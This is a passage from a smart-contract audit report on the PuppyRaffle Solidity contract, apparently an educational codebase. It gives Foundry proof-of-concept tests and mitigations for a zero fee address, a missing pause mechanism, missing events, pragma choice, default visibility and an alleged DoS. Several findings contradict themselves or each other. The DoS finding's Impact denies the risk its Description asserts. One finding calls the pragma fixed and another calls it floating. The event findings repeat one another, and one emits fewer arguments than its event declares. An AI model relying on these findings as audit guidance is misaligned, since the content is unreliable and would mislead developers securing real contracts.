
    function testCanSetZeroFeeAddressAndBurnFees() public {
        // Owner sets fee address to address(0)
        vm.prank(owner);
        puppyRaffle.changeFeeAddress(address(0));
        assertEq(puppyRaffle.feeAddress(), address(0));

        // A raffle runs
        address[] memory players = new address[](4);
        for(uint i=0; i < 4; i++) {
            players[i] = address(uint160(i+1));
        }
        vm.deal(address(this), 4 * entranceFee);
        puppyRaffle.enterRaffle{value: 4 * entranceFee}(players);
        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();

        uint256 fees = uint256(puppyRaffle.totalFees());
        assertTrue(fees > 0);
        
        uint256 zeroAddressBalanceBefore = address(0).balance;
        // Withdraw fees
        puppyRaffle.withdrawFees();
        
        // Check that fees were sent to address(0)
        uint256 zeroAddressBalanceAfter = address(0).balance;
        assertEq(zeroAddressBalanceAfter - zeroAddressBalanceBefore, fees);
        assertEq(puppyRaffle.totalFees(), 0);
    }
}
```

## Suggested Mitigation
Add a `require` statement in both the `constructor` and the `changeFeeAddress` function to ensure the new fee address is not `address(0)`.

```solidity
// In PuppyRaffle.sol

constructor(
    uint256 _entranceFee,
    address _feeAddress,
    uint256 _raffleDuration
) ERC721("Puppy Raffle", "PR") {
    require(_feeAddress != address(0), "PuppyRaffle: Fee address cannot be zero");
    // ...
}

function changeFeeAddress(address newFeeAddress) external onlyOwner {
    require(newFeeAddress != address(0), "PuppyRaffle: Fee address cannot be zero");
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```



# Info Risk Findings

## [I-1]. Pausable Emergency Stop issue in PuppyRaffle::NA

## Description
The contract handles user funds but lacks an emergency stop or pause mechanism. If a critical vulnerability is discovered (like the ones identified in this audit), the owner has no way to halt contract operations to prevent further exploitation or loss of funds. Attackers could continue to interact with the vulnerable functions until a fix is deployed and users migrate.

## Impact
Because the contract cannot be paused, the owner has no on-chain lever to temporarily stop user-facing functions if a separate critical bug is discovered off-chain. While this does not by itself create a new avenue for stealing or locking funds, it removes an important mitigation tool and can prolong the exploitation window of other vulnerabilities.

## Proof of Concept
1. A severe vulnerability is discovered in the `selectWinner` function that allows an attacker to steal the entire prize pool.
2. The owner is notified but cannot pause the contract.
3. Before a fixed contract can be deployed, the attacker repeatedly calls the vulnerable `selectWinner` function at the end of each raffle period, draining all funds collected.
4. Legitimate users lose all their entry fees.

## Proof of Code
```solidity
// This is a conceptual issue, so a provable test is not applicable.
// The PoC is the absence of a pausing mechanism.
```

## Suggested Mitigation
Implement a pausable mechanism using OpenZeppelin's `Pausable` contract. Apply the `whenNotPaused` modifier to all critical functions that perform state changes or handle funds, such as `enterRaffle`, `refund`, `selectWinner`, and `withdrawFees`.

```solidity
import "@openzeppelin/contracts/utils/Pausable.sol";

contract PuppyRaffle is ERC721, Ownable, Pausable {
    // ...

    function enterRaffle(address[] memory newPlayers) public payable whenNotPaused {
        // ...
    }

    function refund(uint256 playerIndex) public whenNotPaused {
        // ...
    }

    function selectWinner() external whenNotPaused {
        // ...
    }

    // Add pause and unpause functions callable by the owner
    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }
}
```

## [I-2]. Event Consistency issue in PuppyRaffle::selectWinner(), withdrawFees()

## Description
The contract performs several critical operations without emitting events. The `selectWinner` function changes significant state (winner, prize distribution, raffle reset) and `withdrawFees` moves all collected fees out of the contract. The absence of events for these actions makes it difficult for off-chain services, monitoring tools, and users to track the contract's activity and history reliably. They would need to rely on tracing transactions, which is less efficient and robust.

## Impact
Lack of events for critical operations reduces observability and makes it harder to build a reliable history of the contract's state. This complicates integration with dapps, dashboards, and monitoring systems, and makes auditing past activity more difficult for users.

## Proof of Concept
1. An off-chain dashboard wants to display a history of all raffle winners and the prize amounts.
2. The `selectWinner` function is called, a winner is chosen, and an NFT is minted. The NFT `Transfer` event is emitted, but it doesn't specify that it was from a raffle win, nor the ETH prize amount.
3. The dashboard cannot easily determine who won the prize pool or how much it was without parsing the internal transaction traces of the `selectWinner` call.
4. Similarly, when the owner calls `withdrawFees`, there is no on-chain log of this event, making it opaque to users tracking the protocol's fee revenue.

## Proof of Code
```solidity
// This is a best-practice issue, so a provable test is not applicable.
// The PoC is the absence of `emit` statements in the specified functions.
```

## Suggested Mitigation
Add events for all critical state-changing functions to improve observability.

```solidity
// In PuppyRaffle.sol

// Add new events
event WinnerSelected(address indexed winner, uint256 prizePool, uint256 tokenId);
event FeesWithdrawn(address indexed feeAddress, uint256 amount);

// In selectWinner()
function selectWinner() external {
    // ... after winner is selected and prize pool calculated
    _safeMint(winner, tokenId);
    emit WinnerSelected(winner, prizePool, tokenId);
}

// In withdrawFees()
function withdrawFees() external {
    // ...
    require(success, "PuppyRaffle: Failed to withdraw fees");
    emit FeesWithdrawn(feeAddress, feesToWithdraw);
}
```

## [I-3]. Pragma issue in PuppyRaffle::NA

## Description
The contract is built using `pragma solidity 0.7.6;`. This version is outdated and does not include significant security enhancements introduced in later versions, most notably the automatic overflow and underflow checks that became standard in Solidity 0.8.0. Relying on an old compiler version increases the risk of introducing vulnerabilities (like the integer overflow found in this contract) and missing out on gas optimizations and other language improvements.

## Impact
Using an outdated pragma makes the contract more susceptible to certain classes of bugs, such as integer overflows, which must be manually checked for. It also prevents the use of newer, more efficient language features and could expose the contract to known compiler bugs from that version.

## Proof of Concept
The `IntegerOverflow` vulnerability identified in this audit (downcasting `fee` to `uint64`) would have been prevented at compile time or would have caused a revert at runtime if the contract had been compiled with Solidity 0.8.0 or newer. The use of `pragma 0.7.6` allowed this bug to exist.

## Proof of Code
```solidity
// This is a configuration/best-practice issue, so a provable test is not applicable.
// The PoC is the pragma line itself in the contract.
// pragma solidity 0.7.6;
```

## Suggested Mitigation
Upgrade the Solidity pragma to a recent, stable version, for example, `^0.8.20`. After upgrading, review the code for any necessary changes. For instance, `SafeMath` is no longer needed for basic arithmetic, as overflow/underflow checks are built-in.

```solidity
// pragma solidity 0.7.6;
pragma solidity ^0.8.20;

// Then, remove any SafeMath library usage if it were present, and
// ensure all arithmetic operations are safe under the new compiler rules.
```

## [I-4]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function executes several critical state changes: it determines a winner, resets the `players` array for the next round, updates `previousWinner`, and sets a new `raffleStartTime`. While the `_safeMint` call emits a standard `Transfer` event for the NFT, the contract does not emit a dedicated event for the raffle conclusion itself. This makes it difficult for off-chain services, frontends, and users to track raffle history, winners, and prize amounts efficiently.

## Impact
The lack of events for critical state changes reduces transparency and makes the contract harder to integrate with external tools. DApp frontends cannot easily display a history of winners, and monitoring services cannot effectively track the protocol's health and activity. Users have to rely on inspecting internal contract state, which is less user-friendly and efficient.

## Proof of Concept
1. A user wants to build a dashboard showing the history of all PuppyRaffle winners and the prize amounts they won.
2. They subscribe to contract events to get this data.
3. They will receive `RaffleEnter` and `RaffleRefunded` events, and ERC721 `Transfer` events.
4. However, there is no `WinnerSelected` event, so they cannot easily correlate the NFT transfer to a specific raffle round or determine the prize amount won. They would have to resort to complex and less reliable methods like tracing transactions that call `selectWinner`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract WinnerEventAbsentTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 60;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xdead), RAFFLE_DURATION);

        // create 4 unique entrant addresses
        address[] memory entrants = new address[](4);
        for (uint256 i; i < 4; i++) {
            entrants[i] = address(uint160(i + 1));
        }

        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(entrants);
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
    }

    function test_noWinnerSelectedEvent() public {
        // keccak256 hash of the missing event signature we expect not to see
        bytes32 WINNER_SELECTED_SIG = keccak256("WinnerSelected(address,uint256,uint256,uint256)");

        vm.recordLogs();
        raffle.selectWinner();
        Vm.Log[] memory logs = vm.getRecordedLogs();

        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics.length > 0) {
                // first topic is the event signature hash
                assertTrue(logs[i].topics[0] != WINNER_SELECTED_SIG, "WinnerSelected event should not exist");
            }
        }
    }
}

## Suggested Mitigation
Define and emit a dedicated event in the `selectWinner` function that captures all relevant information about the concluded raffle round.

```diff
contract PuppyRaffle is ERC721, Ownable {
    // ...

+   event WinnerSelected(
+       address indexed winner,
+       uint256 indexed tokenId,
+       uint256 prizePool,
+       uint256 raffleNumber // Optional: add a raffle counter
+   );

    function selectWinner() external {
        // ... (winner selection logic)
        address winner = players[winnerIndex];
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 tokenId = totalSupply();

        // ...

        _safeMint(winner, tokenId);

+       emit WinnerSelected(winner, tokenId, prizePool);
    }
}
```

## [I-5]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees

## Description
Several functions that execute critical state transitions do not emit events. This lack of event emission reduces the contract's observability and makes it difficult for off-chain services, user interfaces, and monitoring tools to accurately track the contract's lifecycle and state. The missing events include winner selection, raffle restarts, and fee withdrawals.

## Impact
While not a direct security vulnerability that can be exploited for financial gain, poor event logging severely hampers transparency, monitoring, and debugging. It forces users and developers to rely on expensive state-reading calls or complex transaction tracing to understand what happened in the contract, which is inefficient and error-prone.

## Proof of Concept
1. A user participates in the raffle.
2. The `selectWinner` function is called, and a winner is chosen. The prize is sent, an NFT is minted (which does emit a `Transfer` event), the `players` array is cleared, and `raffleStartTime` is reset.
3. An off-chain application monitoring the raffle has no single, clear event like `WinnerSelected` to parse. It would need to infer the raffle's end by watching for a `Transfer` event to a player, which is an indirect and potentially ambiguous signal.

## Proof of Code
```solidity
// N/A. This is an observability issue and cannot be demonstrated as a reverting exploit. A test can only confirm the absence of an event log, which is clear from reading the code.
```

## Suggested Mitigation
Emit events for all significant state changes. This provides a clear, reliable, and cheap way for external parties to track the contract's operations.

```solidity
// Add new events
event WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 indexed tokenId);
event FeesWithdrawn(address indexed feeAddress, uint256 amount);

// In selectWinner function
function selectWinner() external {
    // ... logic to determine winner and prizePool ...
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");

    _safeMint(winner, tokenId);

    emit WinnerSelected(winner, prizePool, tokenId);

    // ... rest of the logic
}

// In withdrawFees function
function withdrawFees() external {
    // ...
    emit FeesWithdrawn(feeAddress, feesToWithdraw);
}
```

## [I-6]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma `pragma solidity ^0.7.6;`. This allows the contract to be compiled with any compiler version from `0.7.6` up to (but not including) `0.8.0`. This can lead to the contract being deployed with different, untested compiler versions, some of which might have bugs. It also reduces the determinism of deployments, making verification on block explorers more difficult.

## Impact
Using a floating pragma may lead to the contract being compiled and deployed with a compiler version that has known or unknown bugs, potentially introducing vulnerabilities. It is a deviation from security best practices.

## Proof of Concept
1. A developer compiles the contract with `solc` version `0.7.6` and tests it.
2. The deployment script or environment uses a different compiler, say `0.7.9`, which is allowed by the pragma.
3. An unknown bug or slight behavior change in the `0.7.9` compiler could introduce subtle issues into the deployed bytecode that were not present during testing.

## Proof of Code
NA

## Suggested Mitigation
Lock the pragma to a specific compiler version that is known to be stable and has been audited. This ensures that the contract bytecode is always the same for a given source code.
```diff
- pragma solidity ^0.7.6;
+ pragma solidity 0.7.6;
```

## [I-7]. Default Visibility issue in PuppyRaffle::NA

## Description
Several state variables in the contract are declared without an explicit visibility keyword (e.g., `public`, `private`, `internal`). For example, `uint256 entranceFee;` and `address[] players;`. While the Solidity compiler assigns a default visibility (`internal` for state variables since version 0.5.0), explicitly declaring visibility is a best practice that improves code clarity and maintainability. It prevents ambiguity about which variables are part of the contract's public API.

## Impact
This does not pose a direct security risk in this contract, but it reduces code quality and can lead to misunderstandings or errors during future upgrades or by developers integrating with the contract. For example, a developer might mistakenly assume `players` is readable externally.

## Proof of Concept
A developer reading the code `uint256 entranceFee;` might not immediately know if it's publicly accessible. They would have to know Solidity's default visibility rules. If it were `uint256 public entranceFee;`, the intent is clear, and a public getter is automatically created.

## Proof of Code
```solidity
// This is a code quality finding. No test case can 'exploit' it.
// The vulnerability is in the code itself.

contract PuppyRaffle {
    // Lacks explicit visibility. Is it public? private? internal?
    // The compiler defaults to internal.
    uint256 entranceFee; 
    address[] players;
    uint256 raffleDuration;
    uint256 raffleStartTime;
    // ... and others
}
```

## Suggested Mitigation
Add an explicit visibility specifier to every state variable to make the contract's storage and API clear and unambiguous.

```solidity
// Before
uint256 entranceFee;
address[] players;

// After (example)
// Make fee public so anyone can read it.
uint256 public entranceFee;
// Keep players private as it's managed internally.
address[] private players;
// Make raffle duration public for transparency.
uint256 public raffleDuration;
```

## [I-8]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function calls `delete players` to clear the array of participants for the next round. For a dynamic array, this operation's gas cost is proportional to the number of elements. If the raffle has a very large number of players, the gas required to delete the array can exceed the block gas limit. This would cause any call to `selectWinner` to fail, effectively creating a permanent Denial of Service where no winner can be selected and all funds are locked.

## Impact
Calling `delete players` only resets the array length to 0, incurring constant-cost storage writes regardless of player count. It cannot run out of gas for having many players, so there is no Denial-of-Service or fund-locking risk attributable to this line.

## Proof of Concept
1. The `players` array is filled with a large number of unique addresses (e.g., several thousand).
2. The raffle duration passes.
3. A user calls `selectWinner()`.
4. The transaction executes up to the `delete players` statement.
5. The gas cost of this operation is too high, causing the transaction to revert with an 'out of gas' error.
6. Since the state is not cleared, any subsequent call will also fail. The contract is now bricked.

## Proof of Code
// A conceptual test. Actually hitting the gas limit depends on the chain's block gas limit.
// The principle is that gas usage scales linearly with array size, and a large enough array will fail.

function test_DoS_OnDeleteLargePlayerArray() public {
    puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, DURATION);

    // This number would need to be very high, e.g., 5000+, depending on the block gas limit.
    // In a test environment with high gas limits, this won't revert but will show high gas usage.
    uint256 largePlayerCount = 1500;
    address[] memory players = new address[](largePlayerCount);
    for(uint i=0; i<largePlayerCount; i++) {
        players[i] = address(uint160(i + 1));
    }
    puppyRaffle.enterRaffle{value: largePlayerCount * ENTRANCE_FEE}(players);

    vm.warp(block.timestamp + DURATION + 1);

    // On a real network, this call would likely fail due to the gas cost of `delete players`.
    // We can't use `vm.expectRevert` for out-of-gas, so we demonstrate by checking gas usage.
    uint256 gasStart = gasleft();
    puppyRaffle.selectWinner();
    uint256 gasUsed = gasStart - gasleft();

    console.log("Gas used for selectWinner with %s players: %s", largePlayerCount, gasUsed);

    // We assert that the gas cost is very high, implying risk of hitting the block limit.
    assertTrue(gasUsed > 5_000_000, "Gas cost for deleting a large array is excessively high");
}

## Suggested Mitigation
Instead of deleting the array, which is costly, re-initialize it. Replace `delete players;` with `players = new address[](0);`. This has a constant, low gas cost regardless of the array's size as it only replaces the storage pointer.



